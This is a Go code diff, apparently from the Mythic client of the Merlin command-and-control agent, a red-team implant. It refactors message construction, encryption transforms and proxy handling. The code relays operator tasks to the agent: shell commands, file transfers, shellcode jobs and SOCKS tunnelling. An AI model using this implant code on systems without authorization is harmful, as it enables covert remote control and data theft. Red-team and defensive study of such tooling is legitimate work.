-func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
-	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertToMythic()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Input Merlin message base:\r\n %+v", m))
+func (client *Client) Construct(m messages.Base) ([]byte, error) {
+	cli.Message(cli.DEBUG, "Entering into clients.mythic.Construct()...")
+	cli.Message(cli.DEBUG, fmt.Sprintf("Input Merlin message base:\n %+v", m))
 
 	var err error
 	var data []byte
@@ -633,7 +714,7 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 			// Marshal the structure to a JSON object
 			data, err = json.Marshal(msg)
 			if err != nil {
-				return "", fmt.Errorf("there was an error marshalling the mythic.CheckIn structrong to JSON:\r\n%s", err)
+				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.CheckIn structrong to JSON:\n%s", err)
 			}
 		} else { // Merlin had no responses to send back
 			task := Tasking{
@@ -644,7 +725,7 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 			// Marshal the structure to a JSON object
 			data, err = json.Marshal(task)
 			if err != nil {
-				return "", fmt.Errorf("there was an error marshalling the mythic.CheckIn structure to JSON:\r\n%s", err)
+				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.CheckIn structure to JSON:\n%s", err)
 			}
 		}
 	case messages.JOBS:
@@ -671,7 +752,7 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 			case jobs.AGENTINFO:
 				info, err := json.Marshal(job.Payload)
 				if err != nil {
-					response.Output = fmt.Sprintf("there was an error marshalling the AgentInfo structure to JSON:\r\n%s", err)
+					response.Output = fmt.Sprintf("there was an error marshalling the AgentInfo structure to JSON:\n%s", err)
 					response.Status = StatusError
 				}
 				response.Output = string(info)
@@ -702,22 +783,22 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 
 					resp, err := client.Send(downloadMessage)
 					if err != nil {
-						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): There was an error sending the mythic FileDownload:DownloadInit message to the server: %s", err)
+						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): There was an error sending the mythic FileDownload:DownloadInit message to the server: %s", err)
 					}
 
 					// Get the file ID from the response
 					if len(resp) <= 0 {
-						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): The were no return messages after requesting a FileID from Mythic")
+						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): The were no return messages after requesting a FileID from Mythic")
 					}
 					if resp[0].Type != messages.JOBS {
-						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): The first message in the response for DownloadInit was not a jobs message")
+						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): The first message in the response for DownloadInit was not a jobs message")
 					}
 					js := resp[0].Payload.([]jobs.Job)
 					if len(js) <= 0 {
-						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): The first message in the response for DownloadInit did not contain any jobs")
+						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): The first message in the response for DownloadInit did not contain any jobs")
 					}
 					if js[0].Type != DownloadSend {
-						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): Expected the first job to be a DownloadSend(%d) job but received %d", DownloadSend, js[0].Type)
+						return []byte{}, fmt.Errorf("clients/mythic.convertToMythicMessage(): Expected the first job to be a DownloadSend(%d) job but received %d", DownloadSend, js[0].Type)
 					}
 
 					// TODO Chunk the data
@@ -735,11 +816,11 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 					downloadMessage.Payload = ctr
 					resp, err = client.Send(downloadMessage)
 					if err != nil {
-						return "", fmt.Errorf("there was an error sending the mythic FileDownload:DownloadSend message to the server: %s", err)
+						return []byte{}, fmt.Errorf("there was an error sending the mythic FileDownload:DownloadSend message to the server: %s", err)
 					}
 					// If this is the only job, then return; else keep processing remaining jobs
 					if len(m.Payload.([]jobs.Job)) == 1 {
-						return "", nil
+						return []byte{}, nil
 					}
 				}
 			case jobs.SOCKS:
@@ -757,14 +838,14 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 				id, ok := mythicSocksConnection.Load(sockMsg.ID)
 				if !ok {
 					err = fmt.Errorf("there was an error mapping the SOCKS connection ID %s to the Mythic connection ID", sockMsg.ID)
-					return "", err
+					return []byte{}, err
 				}
 				sock.ServerId = id.(int32)
 
 				// Base64 encode the data
 				sock.Data = base64.StdEncoding.EncodeToString(sockMsg.Data)
 
-				// Add to return message
+				// Add to return messages
 				returnMessage.SOCKS = append(returnMessage.SOCKS, sock)
 
 				// Clean up the maps
@@ -773,12 +854,12 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 					mythicSocksConnection.Delete(sockMsg.ID)
 				}
 			default:
-				return "", fmt.Errorf("unhandled job type in convertToMythicMessage: %s", job.Type)
+				return []byte{}, fmt.Errorf("unhandled job type in convertToMythicMessage: %s", job.Type)
 			}
 		}
 		// Marshal the structure to a JSON object
 		if len(returnMessage.Responses) == 0 && len(returnMessage.SOCKS) == 0 {
-			// Used when an input Merlin job has a SOCKS type but we drop the message and don't want to send it to Mythic
+			// Used when an input Merlin job has a SOCKS type, but we drop the message and don't want to send it to Mythic
 			task := Tasking{
 				Action:  TASKING,
 				Size:    -1,
@@ -787,22 +868,21 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 			// Marshal the structure to a JSON object
 			data, err = json.Marshal(task)
 			if err != nil {
-				return "", fmt.Errorf("there was an error marshalling the mythic.CheckIn structure to JSON:\r\n%s", err)
+				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.CheckIn structure to JSON:\n%s", err)
 			}
 		} else {
 			data, err = json.Marshal(returnMessage)
 			if err != nil {
-				return "", fmt.Errorf("there was an error marshalling the mythic.PostResponse structure to JSON:\r\n%s", err)
+				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.PostResponse structure to JSON:\n%s", err)
 			}
 		}
-
 	case messages.KEYEXCHANGE:
 		if m.Payload != nil {
-			msg := m.Payload.(RSARequest)
+			msg := m.Payload.(rsa2.Request)
 			msg.Padding = m.Padding
 			data, err = json.Marshal(msg)
 			if err != nil {
-				return "", fmt.Errorf("there was an error marshalling the mythic.RSARequest structrong to JSON:\r\n%s", err)
+				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.RSARequest structrong to JSON:\n%s", err)
 			}
 		}
 	case DownloadInit:
@@ -813,7 +893,7 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(ClientTaskResponse))
 		data, err = json.Marshal(returnMessage)
 		if err != nil {
-			return "", fmt.Errorf("there was an error marshalling the mythic.FileDownloadInitial structure to JSON: %s", err)
+			return []byte{}, fmt.Errorf("there was an error marshalling the mythic.FileDownloadInitial structure to JSON: %s", err)
 		}
 	case DownloadSend:
 		returnMessage := PostResponse{
@@ -823,32 +903,33 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(ClientTaskResponse))
 		data, err = json.Marshal(returnMessage)
 		if err != nil {
-			return "", fmt.Errorf("there was an error marshalling the mythic.FileDownload structure to JSON: %s", err)
+			return []byte{}, fmt.Errorf("there was an error marshalling the mythic.FileDownload structure to JSON: %s", err)
 		}
 	default:
-		return "", fmt.Errorf("unhandled message type: %d for convertToMythicMessage()", m.Type)
+		return []byte{}, fmt.Errorf("unhandled message type: %d for convertToMythicMessage()", m.Type)
 	}
 
-	// AES Encrypt payload
-	ciphertext, err := client.aesEncrypt(data)
-	if err != nil {
-		return "", fmt.Errorf("there was an error AES encrypting the Mythic task:\r\n%s", err)
+	// Transforms
+	cli.Message(cli.DEBUG, fmt.Sprintf("clients/mythic.Construct(): Transformers: %+v", client.transformers))
+	for i := len(client.transformers); i > 0; i-- {
+		if client.transformers[i-1].String() == "mythic" {
+			data, err = client.transformers[i-1].Construct(data, []byte(client.MythicID.String()))
+		} else {
+			data, err = client.transformers[i-1].Construct(data, client.secret)
+		}
+		cli.Message(cli.DEBUG, fmt.Sprintf("%d call with transform %s - Constructed data(%d) %T: %X\n", i, client.transformers[i-1], len(data), data, data))
+		if err != nil {
+			return []byte{}, fmt.Errorf("there was an error transforming the Mythic task:\n%s", err)
+		}
 	}
 
-	// Build Mythic data structure: Base64(<Payload UUID> AES(JSON))
-	payload := append([]byte(client.MythicID.String()), ciphertext...)
-
-	// Base64 encode the payload
-	msg := base64.StdEncoding.EncodeToString(payload)
-
-	return msg, nil
+	return data, nil
 }
 
 // convertSocksToJobs takes in Mythic socks messages and translates them into Merlin jobs
 func (client *Client) convertSocksToJobs(socks []Socks) (base messages.Base, err error) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("Entering into clients.mythic.convertSocksToJobs() with %+v", socks))
 
-	base.Version = 1
 	base.Type = messages.JOBS
 	base.ID = client.AgentID
 
@@ -895,13 +976,12 @@ func (client *Client) convertSocksToJobs(socks []Socks) (base messages.Base, err
 // convertTasksToJobs is a function that converts Mythic tasks into a Merlin jobs structure
 func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertTasksToJobs()")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Input task:\r\n%+v", tasks))
+	cli.Message(cli.DEBUG, fmt.Sprintf("Input task:\n%+v", tasks))
 
 	// Merlin messages.Base structure
 	base := messages.Base{
-		Version: 1,
-		ID:      client.AgentID,
-		Type:    messages.JOBS,
+		ID:   client.AgentID,
+		Type: messages.JOBS,
 	}
 
 	var returnJobs []jobs.Job
@@ -911,47 +991,47 @@ func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
 		var job jobs.Job
 		err := json.Unmarshal([]byte(task.Params), &mythicJob)
 		if err != nil {
-			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the Mythic task parameters to a mythic.Job:\r\n%s", err)
+			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the Mythic task parameters to a mythic.Job:\n%s", err)
 		}
 		job.AgentID = client.AgentID
 		job.ID = task.ID
 		job.Token = uuid.MustParse(task.ID)
-		job.Type = mythicJob.Type
+		job.Type = jobs.IntToType(mythicJob.Type)
 
 		cli.Message(cli.DEBUG, fmt.Sprintf("Switching on mythic.Job type %d", mythicJob.Type))
 
-		switch mythicJob.Type {
+		switch job.Type {
 		case jobs.CMD, jobs.CONTROL, jobs.NATIVE:
 			var payload jobs.Command
-			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
+			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
 			if err != nil {
-				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.CMD structure:\r\n%s", err)
+				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.CMD structure:\n%s", err)
 			}
-			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.Command structure:\r\n%+v", payload))
+			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.Command structure:\n%+v", payload))
 			job.Payload = payload
 			returnJobs = append(returnJobs, job)
 		case jobs.FILETRANSFER:
 			var payload jobs.FileTransfer
-			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
+			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
 			if err != nil {
-				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.FileTransfer structure:\r\n%s", err)
+				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.FileTransfer structure:\n%s", err)
 			}
-			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.FileTransfer structure:\r\n%+v", payload))
+			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.FileTransfer structure:\n%+v", payload))
 			job.Payload = payload
 			returnJobs = append(returnJobs, job)
 		case jobs.MODULE:
 			var payload jobs.Command
-			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
+			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
 			if err != nil {
-				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Command structure:\r\n%s", err)
+				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Command structure:\n%s", err)
 			}
 			job.Payload = payload
 			returnJobs = append(returnJobs, job)
 		case jobs.SHELLCODE:
 			var payload jobs.Shellcode
-			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
+			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
 			if err != nil {
-				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Shellcode structure:\r\n%s", err)
+				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Shellcode structure:\n%s", err)
 			}
 			job.Payload = payload
 			returnJobs = append(returnJobs, job)
@@ -959,7 +1039,7 @@ func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
 			var payload jobs.Socks
 			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
 			if err != nil {
-				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Socks structure:\r\n", err)
+				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Socks structure:\n%s", err)
 			}
 		case 0:
 			// case 0 means that a job type was not added to the task from the Mythic server
@@ -974,7 +1054,7 @@ func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
 				switch params.Action {
 				case "start", "stop":
 					// TODO Set agent sleep to 0 if start
-					// Send message back to Mythic that SOCKS has been started/stoped
+					// Send message back to Mythic that SOCKS has been started/stopped
 					job.Type = jobs.RESULT
 					job.Payload = jobs.Results{}
 					returnJobs = append(returnJobs, job)
@@ -995,99 +1075,52 @@ func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
 	return base, nil
 }
 
-// aesEncrypt reads in plaintext data as aa byte slice, encrypts it with the client's secret key, and returns the ciphertext
-func (client *Client) aesEncrypt(plaintext []byte) ([]byte, error) {
-	// Mythic AES256 Encryption Details
-	// Padding: PKCS7, block size of 16
-	// Mode: CBC
-	// IV is 16 random bytes
-	// Final message: IV + Ciphertext + HMAC
-	// where HMAC is SHA256 with the same AES key over (IV + Ciphertext)
+// getProxy returns a proxy function for the passed in protocol and proxy URL if any
+// Reads the HTTP_PROXY and HTTPS_PROXY environment variables if no proxy URL was passed in
+func getProxy(protocol string, proxyURL string) (func(*http.Request) (*url.URL, error), error) {
+	cli.Message(cli.DEBUG, "Entering into clients.http.getProxy()...")
+	cli.Message(cli.DEBUG, fmt.Sprintf("Protocol: %s, Proxy: %s", protocol, proxyURL))
 
-	cli.Message(cli.DEBUG, "Entering into clients.mythic.aesEncrypt()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Plaintext:\r\n%s", plaintext))
-
-	// Pad plaintext
-	padding := aes.BlockSize - len(plaintext)%aes.BlockSize
-	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
-	plaintext = append(plaintext, padtext...)
-
-	if len(plaintext)%aes.BlockSize != 0 {
-		return nil, fmt.Errorf("plaintext size: %d is not a multiple of the block size: %d", len(plaintext), aes.BlockSize)
+	// The HTTP/2 protocol does not support proxies
+	if strings.ToLower(protocol) != "http" && strings.ToLower(protocol) != "https" {
+		if proxyURL != "" {
+			return nil, fmt.Errorf("clients/http.getProxy(): %s protocol does not support proxies; use http or https protocol", protocol)
+		}
+		cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.getProxy(): %s protocol does not support proxies, continuing without proxy (if any)", protocol))
+		return nil, nil
 	}
 
-	block, err := aes.NewCipher(client.secret)
-	if err != nil {
-		return nil, err
+	var proxy func(*http.Request) (*url.URL, error)
+
+	if proxyURL != "" {
+		rawURL, errProxy := url.Parse(proxyURL)
+		if errProxy != nil {
+			return nil, fmt.Errorf("there was an error parsing the proxy string:\n%s", errProxy.Error())
+		}
+		cli.Message(cli.DEBUG, fmt.Sprintf("Parsed Proxy URL: %+v", rawURL))
+		proxy = http.ProxyURL(rawURL)
+		return proxy, nil
 	}
 
-	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
-	iv := ciphertext[:aes.BlockSize]
-	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
-		return nil, err
+	// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
+	var p string
+	switch strings.ToLower(protocol) {
+	case "http":
+		p = os.Getenv("HTTP_PROXY")
+	case "https":
+		p = os.Getenv("HTTPS_PROXY")
 	}
 
-	// AES CBC Encrypt
-	cbc := cipher.NewCBCEncrypter(block, iv)
-	cbc.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)
-
-	// HMAC
-	hash := hmac.New(sha256.New, client.secret)
-	_, err = hash.Write(ciphertext)
-	if err != nil {
-		return nil, fmt.Errorf("there was an error in the aesEncrypt function writing the HMAC:\r\n%s", err)
+	if p != "" {
+		cli.Message(cli.NOTE,
+			fmt.Sprintf("Using proxy from environment variables for protocol %s: %s", protocol, p))
+		proxy = http.ProxyFromEnvironment
 	}
-
-	// IV + Ciphertext + HMAC
-	return append(ciphertext, hash.Sum(nil)...), nil
+	return proxy, nil
 }
 
-// aesDecrypt reads in ciphertext data as a byte slice, decrypts it with the client's secret key, and returns the plaintext
-func (client *Client) aesDecrypt(ciphertext []byte) ([]byte, error) {
-	cli.Message(cli.DEBUG, "Entering into clients.mythic.aesDecrypt()...")
-	var block cipher.Block
-	var err error
-
-	if block, err = aes.NewCipher(client.secret); err != nil {
-		return nil, err
-	}
-
-	if len(ciphertext) < aes.BlockSize {
-		return nil, fmt.Errorf("ciphertext was not greater than the AES block size")
-	}
-
-	// IV + Ciphertext + HMAC
-	iv := ciphertext[:aes.BlockSize]
-	hash := ciphertext[len(ciphertext)-32:]
-	ciphertext = ciphertext[aes.BlockSize : len(ciphertext)-32]
-
-	// Verify encrypted data is a multiple of the block size
-	if len(ciphertext)%aes.BlockSize != 0 {
-		return nil, fmt.Errorf("ciphertext was not a multiple of the AES block size")
-	}
-
-	// Verify the HMAC hash
-	h := hmac.New(sha256.New, client.secret)
-	_, err = h.Write(append(iv, ciphertext...))
-	if err != nil {
-		return nil, fmt.Errorf("there was an error in the aesDecrypt function writing the HMAC:\r\n%s", err)
-	}
-	if !hmac.Equal(h.Sum(nil), hash) {
-		return nil, fmt.Errorf("there was an error validating the AES HMAC hash, expected: %x but got: %x", h.Sum(nil), hash)
-	}
-
-	// AES CBC Decrypt
-	cbc := cipher.NewCBCDecrypter(block, iv)
-	cbc.CryptBlocks(ciphertext, ciphertext)
-
-	// Remove padding
-	ciphertext = ciphertext[:(len(ciphertext) - int(ciphertext[len(ciphertext)-1]))]
-
-	return ciphertext, nil
-}
-
-// selectIP attempts to identify the single IP address to associate with the agent from all interfaces on the host
-// The goal is to remove link-local and loopback addresses.
+// selectIP identifies a single IP address to associate with the agent from all interfaces on the host.
+// The goal is to remove link-local and loop-back addresses.
 func selectIP(ips []string) string {
 	for _, ip := range ips {
 		if !strings.HasPrefix(ip, "127.") && !strings.HasPrefix(ip, "::1/128") && !strings.HasPrefix(ip, "fe80::") {
